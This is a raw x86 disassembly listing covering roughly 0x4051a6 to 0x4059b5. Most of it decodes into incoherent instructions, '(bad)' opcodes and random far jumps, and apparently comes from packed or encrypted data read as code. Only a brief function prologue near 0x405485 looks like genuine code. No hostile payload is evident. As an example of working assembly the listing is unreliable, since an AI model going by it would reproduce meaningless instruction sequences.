  4051a6:	inc    ebp
  4051a7:	(bad)  
  4051a8:	sar    bl,0x23
  4051ab:	cmp    BYTE PTR [ecx-0x3e952b66],0x7e
  4051b2:	jmp    0x6e43:0x9a2a57f0
  4051b9:	adc    esi,DWORD PTR [ecx-0x1e]
  4051bc:	sbb    al,0x64
  4051be:	fisub  WORD PTR [ecx+esi*8]
  4051c1:	inc    ebx
  4051c2:	ret    0xb8dc
  4051c5:	inc    edx
  4051c6:	cmp    eax,DWORD PTR [edi+0x58]
  4051c9:	xor    eax,0x7170cdc3
  4051ce:	das    
  4051cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051d0:	jae    0x40516e
  4051d2:	and    BYTE PTR [eax+0x722fc8b7],ah
  4051d8:	push   eax
  4051d9:	mov    WORD PTR [edi+edx*2-0x6d],gs
  4051dd:	aas    
  4051de:	push   esi
  4051df:	add    eax,0xc2337bd
  4051e4:	push   esi
  4051e5:	out    dx,al
  4051e6:	dec    ebx
  4051e7:	mov    BYTE PTR [ebx-0x175415dd],dh
  4051ed:	cwde   
  4051ee:	push   esp
  4051ef:	shufps xmm0,XMMWORD PTR [ecx*8-0x393d2c1d],0x99
  4051f8:	jbe    0x405203
  4051fa:	sub    eax,0xb4650bab
  4051ff:	sub    ebp,DWORD PTR [ebx+0x9f29b5e]
  405205:	xchg   ebx,eax
  405206:	cmp    DWORD PTR [esi+eax*2],esp
  405209:	add    DWORD PTR [ebx],0xffffffd3
  40520c:	lock mov ds:0x1ab0fe7d,al
  405212:	outs   dx,DWORD PTR ds:[esi]
  405213:	fnsave [edx-0x4d4868a6]
  405219:	inc    esp
  40521a:	mov    dh,0x17
  40521c:	repnz int 0x97
  40521f:	cmp    al,BYTE PTR [eax-0x3d0b1165]
  405225:	cmc    
  405226:	retf   0x283
  405229:	push   es
  40522a:	lods   al,BYTE PTR ds:[esi]
  40522b:	pop    ss
  40522c:	loop   0x405283
  40522e:	sub    BYTE PTR [edx-0x7c],bl
  405231:	mov    bh,0xbd
  405233:	or     BYTE PTR [edi-0x77],dh
  405236:	outs   dx,DWORD PTR ds:[esi]
  405237:	mov    DWORD PTR [edx-0x1a792ad1],ebp
  40523d:	(bad)  
  40523e:	icebp  
  40523f:	cmp    eax,0x13b48b68
  405244:	(bad)  
  405245:	xchg   ecx,eax
  405246:	mov    ecx,0xf871b32b
  40524b:	not    DWORD PTR [edi]
  40524d:	jmp    0x4052b3
  40524f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405250:	push   ds
  405251:	or     bl,BYTE PTR [ebx-0x32]
  405254:	hlt    
  405255:	mov    cl,0x5f
  405257:	or     eax,0x66c4f332
  40525c:	ret    0xc1ce
  40525f:	inc    eax
  405260:	clc    
  405261:	jp     0x4051ea
  405263:	mov    esi,0x4a1b76d5
  405268:	inc    esp
  405269:	enter  0x1cab,0x34
  40526d:	test   eax,0xdf2690cb
  405272:	dec    eax
  405273:	test   BYTE PTR [edx-0x66],0x22
  405277:	sub    bl,BYTE PTR [edx+eax*2-0x49]
  40527b:	aaa    
  40527c:	jb     0x4052c1
  40527e:	adc    al,0xb5
  405280:	push   ecx
  405281:	mov    ds:0x3ab4f0bf,eax
  405286:	or     BYTE PTR [esi-0x5325b360],cl
  40528c:	mov    dl,0xe2
  40528e:	xor    DWORD PTR [ecx+0x36b6465a],ebp
  405294:	push   ebp
  405295:	mov    bh,cl
  405297:	fsub   QWORD PTR [ebx+ebx*2]
  40529a:	xchg   edi,eax
  40529b:	ins    BYTE PTR es:[edi],dx
  40529c:	push   0x41ac6175
  4052a1:	xor    ebx,DWORD PTR [esi+0x54d2e6c6]
  4052a7:	cmp    DWORD PTR [eax+0x542b9220],ebp
  4052ad:	les    esp,FWORD PTR [ebx-0x7a]
  4052b0:	sbb    eax,0x385a2908
  4052b5:	jl     0x405244
  4052b7:	sbb    esi,DWORD PTR [edx*4-0x6a1444da]
  4052be:	in     eax,0xf7
  4052c0:	clc    
  4052c1:	ret    0xaab9
  4052c4:	and    ah,BYTE PTR [edi]
  4052c6:	cdq    
  4052c7:	push   edi
  4052c8:	xchg   esp,eax
  4052c9:	jecxz  0x405309
  4052cb:	sbb    dl,BYTE PTR [eax]
  4052cd:	add    eax,0x70659bab
  4052d2:	push   DWORD PTR [edx+0x1f5bd6f3]
  4052d8:	jge    0x405341
  4052da:	es push ecx
  4052dc:	xchg   esi,eax
  4052dd:	xchg   ebp,eax
  4052de:	rol    DWORD PTR [ebx-0x3f2ea07e],cl
  4052e4:	ins    DWORD PTR es:[edi],dx
  4052e5:	sbb    bl,BYTE PTR [eax]
  4052e7:	mov    dl,0x1d
  4052e9:	cmc    
  4052ea:	xchg   edi,eax
  4052eb:	jne    0x4052bd
  4052ed:	push   0x3a81e95c
  4052f2:	jno    0x405308
  4052f4:	scas   eax,DWORD PTR es:[edi]
  4052f5:	frstor [edi+0x24]
  4052f8:	push   ss
  4052f9:	xchg   ebp,eax
  4052fa:	cmp    al,0x15
  4052fc:	dec    ebp
  4052fd:	sbb    cl,0x5b
  405300:	sbb    ah,BYTE PTR [edx-0x63]
  405303:	jae    0x405325
  405305:	lahf   
  405306:	lock retw 0xa4f1
  40530b:	sub    BYTE PTR [ecx+0x6daf8fb6],cl
  405311:	mov    BYTE PTR [ebx+0x323b08e5],cl
  405317:	loop   0x405342
  405319:	add    eax,0x3e4529ca
  40531e:	pop    es
  40531f:	lods   eax,DWORD PTR cs:[esi]
  405321:	cs xchg esi,eax
  405323:	clc    
  405324:	std    
  405325:	lods   al,BYTE PTR ds:[esi]
  405326:	mov    ds:0x963d1137,eax
  40532b:	xchg   esi,eax
  40532c:	jno    0x40534b
  40532e:	fisttp WORD PTR [eax+0x2496e4a8]
  405334:	lods   eax,DWORD PTR ss:[esi]
  405336:	and    DWORD PTR [edi],edi
  405338:	push   ecx
  405339:	jns    0x405394
  40533b:	jo     0x405342
  40533d:	add    ecx,0x9139e3a8
  405343:	mov    bh,BYTE PTR [ebx+0x56]
  405346:	icebp  
  405347:	pop    ebp
  405348:	push   ebp
  405349:	adc    al,0x68
  40534b:	stos   BYTE PTR es:[edi],al
  40534c:	inc    ecx
  40534d:	aam    0xcc
  40534f:	xchg   ecx,eax
  405350:	fdivp  st(4),st
  405352:	imul   ebp,DWORD PTR [eax+ebx*8-0x6f],0x4e
  405357:	out    0x5a,eax
  405359:	inc    edx
  40535a:	scas   al,BYTE PTR es:[edi]
  40535b:	nop
  40535c:	fadd   DWORD PTR ds:[ebp+0x7e]
  405360:	ja     0x40532e
  405362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405363:	push   es
  405364:	cmp    ebx,DWORD PTR [edi+eiz*4]
  405367:	fcomip st,st(1)
  405369:	inc    ecx
  40536a:	fwait
  40536b:	cli    
  40536c:	mov    esi,ecx
  40536e:	adc    al,0xa0
  405370:	sbb    BYTE PTR [ebx],bh
  405372:	int    0x22
  405374:	pusha  
  405375:	stos   DWORD PTR es:[edi],eax
  405376:	sub    al,0x10
  405378:	ror    BYTE PTR [edi],0xaf
  40537b:	add    ch,BYTE PTR ds:0xa0b48440
  405381:	jg     0x40534a
  405383:	jp     0x405323
  405385:	int3   
  405386:	stc    
  405387:	push   esi
  405388:	stc    
  405389:	xchg   edx,eax
  40538a:	push   ds
  40538b:	mov    eax,DWORD PTR [edi+ebp*4]
  40538e:	xchg   edi,eax
  40538f:	repz or eax,esi
  405392:	inc    eax
  405393:	retf   0x49f6
  405396:	jmp    0x7992:0xbfa668e1
  40539d:	mov    ds:0x7a54a554,eax
  4053a2:	std    
  4053a3:	mov    cl,BYTE PTR [edx*2+0x320ad072]
  4053aa:	rol    BYTE PTR [eax+0x7a],0xe3
  4053ae:	stos   BYTE PTR es:[edi],al
  4053af:	lods   al,BYTE PTR ds:[esi]
  4053b0:	mov    eax,ds:0xd32ef468
  4053b5:	div    BYTE PTR [edx]
  4053b7:	inc    esp
  4053b8:	pushf  
  4053b9:	sub    DWORD PTR [ebp+0x5a82ab95],0xe
  4053c0:	inc    ecx
  4053c1:	dec    ebp
  4053c2:	aas    
  4053c3:	pop    ss
  4053c4:	or     eax,0x7343fd1a
  4053c9:	pop    esi
  4053ca:	retf   
  4053cb:	call   0x794de9fa
  4053d0:	iret   
  4053d1:	mov    ch,0x62
  4053d3:	xchg   esi,eax
  4053d4:	cmc    
  4053d5:	add    al,0xc4
  4053d7:	sub    BYTE PTR [esi+0x1c01c26a],dh
  4053dd:	xor    esp,DWORD PTR [ecx-0x38]
  4053e0:	shl    DWORD PTR [eax],0xdf
  4053e3:	mov    ds,WORD PTR [eax]
  4053e5:	jecxz  0x405400
  4053e7:	mov    ss,WORD PTR [ebx-0x6d]
  4053ea:	adc    DWORD PTR [edx+eiz*2-0x26],edx
  4053ee:	or     al,0x38
  4053f0:	push   ss
  4053f1:	or     eax,0x4eab91ae
  4053f6:	mov    edi,DWORD PTR [eax-0x7152d170]
  4053fc:	and    BYTE PTR [eax],cl
  4053fe:	mov    edi,0x1018b874
  405403:	push   ss
  405404:	sbb    esp,DWORD PTR [ebx-0x24]
  405407:	les    edx,FWORD PTR [ebx+0x12c4bb6a]
  40540d:	jl     0x40547f
  40540f:	and    edx,edi
  405411:	pop    eax
  405412:	pop    esi
  405413:	ficom  WORD PTR [edx+ecx*1-0x6eca34cc]
  40541a:	mov    dh,0x7c
  40541c:	add    al,BYTE PTR ds:0x5759af7f
  405422:	and    cl,BYTE PTR [ecx+ebp*4-0x288ca1b5]
  405429:	rcr    DWORD PTR [eax+0x7d2c83af],1
  40542f:	scas   al,BYTE PTR es:[edi]
  405430:	cmp    BYTE PTR [eax+0x46],ah
  405433:	add    edx,edi
  405435:	out    dx,eax
  405436:	dec    esp
  405437:	jmp    0x1a195384
  40543c:	ss push ebp
  40543e:	daa    
  40543f:	or     dl,ah
  405441:	jnp    0x405455
  405443:	dec    esi
  405444:	pop    edi
  405445:	sbb    BYTE PTR [edi+0x27],ah
  405448:	or     cl,bh
  40544a:	(bad)  
  40544b:	arpl   WORD PTR [eax+ebp*2-0x48022118],bp
  405452:	inc    ebx
  405453:	ins    BYTE PTR es:[edi],dx
  405454:	mov    esi,0x396ef9c
  405459:	retf   
  40545a:	test   al,0x67
  40545c:	bound  eax,QWORD PTR [ebx+0x32]
  40545f:	sbb    al,0x6
  405461:	int3   
  405462:	cdq    
  405463:	pop    ebx
  405464:	pop    es
  405465:	cld    
  405466:	mov    ecx,0x50b55b3f
  40546b:	add    BYTE PTR [ebx+0x3ad7536e],cl
  405471:	sbb    BYTE PTR [esi+0x49],dl
  405474:	out    0x77,eax
  405476:	test   DWORD PTR [edx+0x6f],ebp
  405479:	loope  0x4054b8
  40547b:	mov    al,0xec
  40547d:	xor    eax,0xc95e28df
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e884
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e7eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	ror    DWORD PTR [ebx+0x37104c62],0x70
  4054af:	jo     0x40545b
  4054b1:	jle    0x405523
  4054b3:	jo     0x40546d
  4054b5:	and    BYTE PTR [ecx],ah
  4054b7:	inc    edi
  4054b8:	ret    0x9b36
  4054bb:	movups XMMWORD PTR ds:0xef7eab66,xmm2
  4054c2:	mov    esi,DWORD PTR [eax-0xaae251b]
  4054c8:	push   edi
  4054c9:	xor    edi,DWORD PTR [ecx+0x5a]
  4054cc:	push   ebx
  4054cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ce:	pop    edi
  4054cf:	sub    al,0x7
  4054d1:	mov    DWORD PTR [edi-0x69],0xa76613f8
  4054d8:	sar    BYTE PTR [edx+0xba078a1],0x9f
  4054df:	addr16 mov ch,0x2e
  4054e2:	sti    
  4054e3:	xor    esi,edi
  4054e5:	retf   0x26f3
  4054e8:	rcl    DWORD PTR [ebp-0x2d],0xe8
  4054ec:	pusha  
  4054ed:	or     al,0x76
  4054ef:	xor    al,0xe6
  4054f1:	mov    ds:0xe67d35ad,al
  4054f6:	mov    dl,dl
  4054f8:	jmp    FWORD PTR [ecx-0x58d740c8]
  4054fe:	lahf   
  4054ff:	inc    edi
  405500:	sti    
  405501:	ror    DWORD PTR [ebx],0xd7
  405504:	xchg   esi,eax
  405505:	ds idiv dh
  405508:	push   esp
  405509:	es cmc 
  40550b:	ret    0x82a8
  40550e:	inc    ecx
  40550f:	idiv   esp
  405511:	imul   eax,DWORD PTR [ebx+0x4b0cb259],0xb5ea2bdc
  40551b:	ins    BYTE PTR es:[edi],dx
  40551c:	push   ds
  40551d:	xchg   edi,eax
  40551e:	add    BYTE PTR [ecx],dl
  405520:	adc    eax,0x605e2039
  405525:	adc    BYTE PTR [edi-0xc],bl
  405528:	call   0xce30:0xdce6b7e5
  40552f:	popa   
  405530:	push   0x6f
  405532:	xlat   BYTE PTR ds:[ebx]
  405533:	ds push ebp
  405535:	pop    edx
  405536:	je     0x405517
  405538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405539:	stos   BYTE PTR es:[edi],al
  40553a:	sub    edx,DWORD PTR [ebx+0x241ea11a]
  405540:	imul   ebx,DWORD PTR [edi],0x53c03775
  405546:	push   0x4b148430
  40554b:	outs   dx,BYTE PTR cs:[esi]
  40554d:	jge    0x405519
  40554f:	addr16 (bad) 
  405551:	(bad)  
  405552:	sbb    eax,0x79738e36
  405557:	call   0x224c:0xa31fe35b
  40555e:	imul   eax,DWORD PTR [ecx+0x6b],0xe781b431
  405565:	stos   BYTE PTR es:[edi],al
  405566:	sti    
  405567:	mov    bl,0x36
  405569:	and    esi,DWORD PTR [esi]
  40556b:	push   ss
  40556c:	dec    esp
  40556d:	dec    esi
  40556e:	and    eax,0xc292c121
  405573:	ins    DWORD PTR es:[edi],dx
  405574:	nop
  405575:	push   edi
  405576:	mov    eax,ds:0x7c9b6554
  40557b:	push   0xaaba369f
  405580:	outs   dx,BYTE PTR ds:[esi]
  405581:	dec    eax
  405582:	push   esi
  405583:	mov    fs,WORD PTR [edi]
  405585:	or     bl,cl
  405587:	and    esp,DWORD PTR [edi+0x9089968]
  40558d:	inc    edx
  40558e:	test   al,0x25
  405590:	add    esp,DWORD PTR [ebp-0x14875158]
  405596:	dec    ecx
  405597:	mov    eax,0xe0aace2e
  40559c:	jno    0x4055e7
  40559e:	das    
  40559f:	(bad)  
  4055a0:	shl    BYTE PTR [esi-0x16968d66],cl
  4055a6:	xor    dl,BYTE PTR [ecx+0x6]
  4055a9:	loop   0x405543
  4055ab:	sub    eax,DWORD PTR [ebp+0x744a88bf]
  4055b1:	rcr    BYTE PTR [eax+0x1f25a5e2],0xfa
  4055b8:	fnsave [edx]
  4055ba:	pop    ebp
  4055bb:	dec    edi
  4055bc:	fwait
  4055bd:	push   es
  4055be:	mov    esi,0x94c6919a
  4055c3:	movq   QWORD PTR [eax-0x2ca11f0e],mm5
  4055ca:	inc    ebp
  4055cb:	daa    
  4055cc:	mov    ds:0x15daf23a,eax
  4055d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055d2:	ror    edx,0xf4
  4055d5:	and    DWORD PTR [ebx+0x1f],0x8deeee37
  4055dc:	mov    ecx,0x865bec8f
  4055e1:	or     DWORD PTR [edx-0x28d29301],esi
  4055e7:	or     al,0x49
  4055e9:	pusha  
  4055ea:	mov    BYTE PTR [eax-0x3e],cl
  4055ed:	test   DWORD PTR [edi],eax
  4055ef:	in     eax,dx
  4055f0:	shr    BYTE PTR [esi-0x3b68c1ff],0x1
  4055f7:	push   ss
  4055f8:	popaw  
  4055fa:	and    DWORD PTR [ecx],0x709765d2
  405600:	xor    eax,0x7ebc4b0d
  405605:	enter  0xaf5e,0x7b
  405609:	mov    ah,BYTE PTR [edx-0x5bc27551]
  40560f:	in     al,dx
  405610:	jp     0x4055a6
  405612:	xchg   ecx,eax
  405613:	sbb    al,0xfc
  405615:	int3   
  405616:	mov    edi,0xd419c7c
  40561b:	js     0x4055ad
  40561d:	mov    ds:0xed8cb66d,eax
  405622:	(bad)  
  405623:	dec    ebx
  405624:	jo     0x405639
  405626:	and    eax,ecx
  405628:	fsubr  QWORD PTR ds:0x41e19582
  40562e:	jmp    0x40562e
  405630:	pop    eax
  405631:	or     eax,0xcd4a0cc5
  405636:	dec    ebx
  405637:	pop    esp
  405638:	inc    esp
  405639:	or     ebp,DWORD PTR [edi+0x284e4fdb]
  40563f:	shl    BYTE PTR [ebp-0x6b],cl
  405642:	popa   
  405643:	mov    DWORD PTR [ebx],edi
  405645:	push   ebp
  405646:	adc    BYTE PTR [edi+0x3958f74c],dh
  40564c:	cmp    al,0xcf
  40564e:	adc    BYTE PTR [eax+0x0],dl
  405651:	lods   eax,DWORD PTR ds:[esi]
  405652:	jns    0x405662
  405654:	mov    cl,0x8b
  405656:	mov    ?,WORD PTR [edx+0x8]
  405659:	mov    dh,BYTE PTR [ecx]
  40565b:	mov    fs,WORD PTR [edx+0x60]
  40565e:	out    0xda,al
  405660:	hlt    
  405661:	into   
  405662:	xor    al,0xbc
  405664:	stc    
  405665:	fwait
  405666:	jmp    0xaaa9:0x3aa3691b
  40566d:	mov    al,bl
  40566f:	lods   al,BYTE PTR ds:[esi]
  405670:	and    al,0x32
  405672:	dec    esi
  405673:	xchg   ebp,eax
  405674:	and    cl,0xfa
  405677:	sbb    DWORD PTR [edi-0x53],0x34
  40567b:	and    eax,0xa6e3d4c9
  405680:	or     bl,BYTE PTR [esi+ecx*1+0x75]
  405684:	mov    dl,0x4
  405686:	retf   0x1c31
  405689:	jb     0x40568c
  40568b:	pusha  
  40568c:	push   0x21
  40568e:	stos   DWORD PTR es:[edi],eax
  40568f:	sbb    BYTE PTR [ebp+esi*2+0x10],0x30
  405694:	(bad)  
  405695:	(bad)  [ebp-0x1a0484ad]
  40569b:	add    BYTE PTR [esi-0x57],0x8c
  40569f:	cmp    esp,ebx
  4056a1:	jg     0x40566c
  4056a3:	loopne 0x40567e
  4056a5:	fdiv   st(7),st
  4056a7:	loop   0x40570f
  4056a9:	push   es
  4056aa:	adc    al,0xf
  4056ac:	add    eax,0xaf25322d
  4056b1:	js     0x405666
  4056b3:	xlat   BYTE PTR ds:[ebx]
  4056b4:	mov    al,ds:0x598304e6
  4056b9:	aas    
  4056ba:	push   ss
  4056bb:	mov    dl,bl
  4056bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056be:	arpl   WORD PTR [edi+0x21af5c5e],sp
  4056c4:	ret    
  4056c5:	pop    edx
  4056c6:	test   eax,0x1dee884f
  4056cb:	add    BYTE PTR [edx],0x40
  4056ce:	or     ah,BYTE PTR [ebp+0x18]
  4056d1:	stos   BYTE PTR es:[edi],al
  4056d2:	test   eax,0x91cf20ae
  4056d7:	test   al,0x8c
  4056d9:	scas   al,BYTE PTR es:[edi]
  4056da:	repz and DWORD PTR [ecx-0x16dcd18c],eax
  4056e1:	aaa    
  4056e2:	add    eax,0x5072cbbd
  4056e7:	je     0x4056d6
  4056e9:	in     al,0xe4
  4056eb:	add    esp,DWORD PTR [ecx]
  4056ed:	mov    es,edx
  4056ef:	adc    BYTE PTR [ecx-0x52],cl
  4056f2:	mov    eax,ds:0x98f07afb
  4056f7:	ret    
  4056f8:	dec    edi
  4056f9:	and    edx,eax
  4056fb:	inc    bp
  4056fd:	push   esi
  4056fe:	(bad)  
  4056ff:	and    dh,BYTE PTR [eax-0x25]
  405702:	outs   dx,BYTE PTR ds:[esi]
  405703:	outs   dx,DWORD PTR ds:[esi]
  405704:	mov    ch,cl
  405706:	adc    esi,DWORD PTR [ecx-0x35]
  405709:	out    0xd0,al
  40570b:	aam    0xd2
  40570d:	imul   ecx,edx,0xffffffd8
  405710:	cs cdq 
  405712:	fild   DWORD PTR [ebp-0x6f]
  405715:	(bad)  
  405716:	bound  eax,QWORD PTR [eax-0x33]
  405719:	bound  esp,QWORD PTR [ecx+0x57]
  40571c:	or     bh,dl
  40571e:	ret    
  40571f:	data16 fisub WORD PTR [edx]
  405723:	sbb    bl,ch
  405725:	fcmovne st,st(0)
  405727:	add    cl,BYTE PTR [ebx+0x3d]
  40572a:	mov    ch,0x66
  40572c:	jge    0x40576d
  40572e:	ins    DWORD PTR es:[edi],dx
  40572f:	xlat   BYTE PTR ds:[ebx]
  405730:	clc    
  405731:	sar    ebx,0x93
  405734:	jne    0x40574d
  405736:	mov    dl,0x27
  405738:	mov    ch,0xd8
  40573a:	es out 0x7,al
  40573d:	pop    esi
  40573e:	je     0x405708
  405740:	jmp    0xa10aa0d2
  405745:	lds    ebx,FWORD PTR [edi]
  405747:	pop    edx
  405748:	jno    0x405734
  40574a:	call   0x7c95:0xa392a0c0
  405751:	cmp    edx,DWORD PTR [ecx+0x1e]
  405754:	jns    0x405766
  405756:	fdiv   QWORD PTR [ebx-0x1282ce07]
  40575c:	dec    ebp
  40575d:	loopne 0x4057b9
  40575f:	pusha  
  405760:	rol    BYTE PTR [ebp-0x2271af3a],0xbc
  405767:	mov    ch,0x66
  405769:	sbb    dl,BYTE PTR [ecx+0xf]
  40576c:	mov    bh,0x5
  40576e:	xchg   dh,bh
  405770:	inc    edx
  405771:	add    BYTE PTR [ebx],ah
  405773:	add    eax,0x42fe7a
  405778:	mov    ds:0x42fe86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x4cb56e42],eax
  405790:	adc    al,0x20
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	mov    esp,0xa1ba26db
  40579f:	xchg   esp,eax
  4057a0:	rcl    BYTE PTR [eax+0x236dc215],cl
  4057a6:	pusha  
  4057a7:	inc    edi
  4057a8:	xchg   DWORD PTR [edx-0x1c],esi
  4057ab:	pop    es
  4057ac:	out    0x84,al
  4057ae:	lds    ebx,FWORD PTR [edi+0x1ed193b4]
  4057b4:	pop    es
  4057b5:	gs addr16 aas 
  4057b8:	mov    ch,0xfe
  4057ba:	jle    0x405775
  4057bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057bd:	sbb    DWORD PTR [ebx-0xf],0x4b
  4057c1:	cmc    
  4057c2:	ja     0x40576e
  4057c4:	jg     0x405781
  4057c6:	mov    ?,WORD PTR [ebx-0x294d988]
  4057cc:	mov    WORD PTR [edx+0x15],gs
  4057cf:	cmp    ebx,DWORD PTR [edi-0xa5de906]
  4057d5:	inc    esi
  4057d6:	and    DWORD PTR [esi-0xa],0xffffff86
  4057da:	(bad)  
  4057db:	adc    al,0x10
  4057dd:	or     eax,0xe55ff53e
  4057e2:	cmp    eax,ebx
  4057e4:	nop
  4057e5:	mov    ebx,0x665f8884
  4057ea:	jmp    0x405782
  4057ec:	jo     0x405828
  4057ee:	and    al,0x5
  4057f0:	xchg   esp,eax
  4057f1:	sub    esi,0x31
  4057f4:	dec    edx
  4057f5:	mov    dh,0x3d
  4057f7:	push   ebx
  4057f8:	jmp    0x405829
  4057fa:	and    BYTE PTR [esi-0x5f],cl
  4057fd:	or     al,0x76
  4057ff:	mov    ch,0xea
  405801:	fisub  DWORD PTR [eax+0x38]
  405804:	out    dx,eax
  405805:	ins    BYTE PTR es:[edi],dx
  405806:	or     BYTE PTR [esi],bl
  405808:	dec    esp
  405809:	push   edi
  40580a:	mov    edx,0x3b19773b
  40580f:	pushf  
  405810:	repz xor bl,BYTE PTR [edx+0x43]
  405814:	add    edi,0x63edcf1e
  40581a:	mov    eax,ds:0x9a36a421
  40581f:	aam    0xc6
  405821:	add    edx,ecx
  405823:	les    ecx,FWORD PTR [esi+esi*4]
  405826:	mov    edx,0x25adbc17
  40582b:	jae    0x405882
  40582d:	mov    bl,0x89
  40582f:	cmp    DWORD PTR [edx+0x706b863b],ebx
  405835:	and    eax,0x81d11f9d
  40583a:	and    DWORD PTR [esi],esp
  40583c:	sub    esi,DWORD PTR [edx-0x8248a5a]
  405842:	sbb    DWORD PTR [eax+0x1fa139e8],ecx
  405848:	add    BYTE PTR [ecx-0x46],dl
  40584b:	adc    eax,0xc22a8e9f
  405850:	dec    ecx
  405851:	(bad)  
  405853:	and    esp,DWORD PTR [edi+0x3d238739]
  405859:	sbb    eax,0xf48c467f
  40585e:	xchg   esi,eax
  40585f:	or     BYTE PTR [edx+0x7feaf6d6],ch
  405865:	or     BYTE PTR [esp+ebx*8],cl
  405868:	stos   DWORD PTR es:[edi],eax
  405869:	mov    cl,BYTE PTR [ebp-0x1143b90c]
  40586f:	leave  
  405870:	jmp    0x4058d3
  405872:	call   0x3ae9c2ed
  405877:	and    DWORD PTR [edx+0x55],esp
  40587a:	scas   al,BYTE PTR es:[edi]
  40587b:	ds sub eax,0xf0ecfe72
  405881:	sbb    al,0x72
  405883:	in     eax,dx
  405884:	mov    bh,0x14
  405886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405887:	pop    es
  405888:	out    0xbd,eax
  40588a:	push   edx
  40588b:	adc    eax,eax
  40588d:	fld    st(1)
  40588f:	call   0x8b8a:0x3bc260b
  405896:	xchg   esi,eax
  405897:	test   eax,0x432eca9f
  40589c:	je     0x405839
  40589e:	inc    ebx
  40589f:	push   0xfd603a11
  4058a4:	(bad)  
  4058a5:	outs   dx,BYTE PTR ds:[esi]
  4058a6:	mov    esi,0x1f4653d4
  4058ab:	push   0x75
  4058ad:	jl     0x405850
  4058af:	mov    dl,0x91
  4058b1:	jmp    0x405903
  4058b3:	dec    edi
  4058b4:	sub    BYTE PTR [eax+0x695da7fa],cl
  4058ba:	xlat   BYTE PTR ds:[ebx]
  4058bb:	push   esi
  4058bc:	cmp    al,0xe8
  4058be:	das    
  4058bf:	pushf  
  4058c0:	mov    ebx,0xc5bebe56
  4058c5:	push   edi
  4058c6:	and    dh,BYTE PTR [esi-0x3a49f2fe]
  4058cc:	rol    DWORD PTR [edi],cl
  4058ce:	int3   
  4058cf:	jge    0x405928
  4058d1:	or     edx,DWORD PTR [ebp+0x6b]
  4058d4:	call   0xb969:0xc88c55e9
  4058db:	rcr    edx,cl
  4058dd:	sbb    DWORD PTR [edx],eax
  4058df:	mov    al,ds:0xcb22e3e0
  4058e4:	push   es
  4058e5:	test   al,bl
  4058e7:	xlat   BYTE PTR ds:[ebx]
  4058e8:	inc    esi
  4058e9:	cmp    eax,0xe9e78621
  4058ee:	pop    ecx
  4058ef:	les    esp,FWORD PTR [edi+0x74]
  4058f2:	in     eax,dx
  4058f3:	xchg   ebp,eax
  4058f4:	aad    0xe4
  4058f6:	out    0x96,eax
  4058f8:	int    0xbc
  4058fa:	jge    0x405939
  4058fc:	push   ecx
  4058fd:	xor    eax,0x51cf7918
  405902:	xor    bl,ah
  405904:	push   esp
  405905:	mov    dl,al
  405907:	inc    edx
  405908:	idiv   BYTE PTR [esi-0x10d9501e]
  40590e:	(bad)  [esi+0x2a]
  405911:	inc    esp
  405912:	mov    ds:0x4a6bceff,al
  405917:	mov    ds:0x3eb7375a,eax
  40591c:	rcr    BYTE PTR [ebx+edi*1-0x3a],cl
  405920:	aam    0x25
  405922:	iret   
  405923:	jmp    0x48f1:0x708c34c9
  40592a:	jge    0x405933
  40592c:	call   0xa755a36f
  405931:	and    BYTE PTR [ecx+0x65e5d9ae],dh
  405937:	stos   BYTE PTR es:[edi],al
  405938:	push   ecx
  405939:	add    esi,DWORD PTR [eax+0x38]
  40593c:	in     al,dx
  40593d:	pop    ss
  40593e:	retf   
  40593f:	jo     0x405903
  405941:	ss (bad) 
  405943:	(bad)  
  405945:	cld    
  405946:	mov    WORD PTR [esi-0x6d],?
  405949:	adc    eax,0xa3667fba
  40594e:	rcr    DWORD PTR [ebx],cl
  405950:	rcr    ch,0x80
  405953:	mov    BYTE PTR [ebx+0x69],dh
  405956:	sub    DWORD PTR [eax+0x1f],esi
  405959:	jnp    0x4058eb
  40595b:	adc    dl,BYTE PTR [edi-0x3e5bc061]
  405961:	push   ecx
  405962:	cs icebp 
  405964:	dec    ebp
  405965:	xchg   ecx,eax
  405966:	lock in al,dx
  405968:	mov    bh,0x7
  40596a:	dec    eax
  40596b:	imul   ebp,DWORD PTR [edi-0x2064cdb7],0x5c972788
  405975:	xlat   BYTE PTR ds:[ebx]
  405976:	daa    
  405977:	mov    ds:0xec91d787,al
  40597c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597d:	loop   0x40593c
  40597f:	pop    edi
  405980:	or     DWORD PTR [edi],0xf7e4a2bf
  405986:	int    0x4b
  405988:	aaa    
  405989:	push   esi
  40598a:	dec    ecx
  40598b:	data16 adc dl,BYTE PTR [eax]
  40598e:	sub    BYTE PTR [ebx-0x1d],dh
  405991:	jb     0x4059c0
  405993:	stos   BYTE PTR es:[edi],al
  405994:	xchg   ebp,eax
  405995:	loopne 0x4059a8
  405997:	sahf   
  405998:	push   ebp
  405999:	xor    al,0x52
  40599b:	arpl   WORD PTR [esi+0x1d],ax
  40599e:	and    cl,dl
  4059a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a1:	add    eax,0xb3b4637f
  4059a6:	jl     0x4059e9
  4059a8:	call   FWORD PTR [ebp+edx*2+0x32]
  4059ac:	jns    0x40598b
  4059ae:	aaa    
  4059af:	mov    ebx,0x38a2221
  4059b4:	push   ebp
  4059b5:	jb     0x40593d
